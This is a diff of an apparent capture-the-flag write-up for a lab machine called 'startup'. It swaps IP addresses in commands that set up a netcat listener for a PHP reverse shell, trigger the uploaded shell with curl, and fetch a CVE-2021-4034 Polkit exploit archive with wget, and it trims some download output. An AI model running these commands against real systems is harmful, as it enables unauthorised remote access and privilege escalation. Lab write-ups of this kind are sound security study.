@@ -120,7 +120,7 @@ https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell
 nc -lnvp 4444
 ```
 ```
-curl http://10.10.226.14/files/ftp/2.php
+curl http://10.10.6.26/files/ftp/2.php
 ```
 ```
 nc -lnvp 4444
@@ -142,15 +142,11 @@ ls -la /usr/bin/pkexec
 
 ```
 www-data@startup:/$ cd tmp
-wget 10.8.95.102/poc.tar
+wget 10.10.10.10/poc.tar
 ```
 poc.tar is CVE-2021-4034 exploit(Polkit)
 
 ```
---2022-07-10 08:36:06--  http://10.8.95.102/poc.tar
-Connecting to 10.8.95.102:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 235520 (230K) [application/x-tar]
 Saving to: 'poc.tar'
 
 poc.tar             100%[===================>] 230.00K  78.9KB/s    in 2.9s
